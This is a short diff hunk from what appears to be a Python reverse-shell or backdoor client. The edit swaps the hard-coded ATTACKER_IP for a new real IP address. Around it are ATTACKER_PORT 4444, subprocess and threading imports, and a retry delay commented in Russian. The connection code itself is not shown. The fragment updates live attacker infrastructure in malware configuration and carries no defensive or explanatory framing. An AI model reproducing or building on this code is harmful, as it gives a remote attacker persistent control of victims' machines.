@@ -4,7 +4,7 @@ import subprocess
 import threading
 import time
 
-ATTACKER_IP = "178.173.251.214"
+ATTACKER_IP = "138.124.123.41"
 ATTACKER_PORT = 4444
 RETRY_DELAY = 60  # секунд между попытками
 
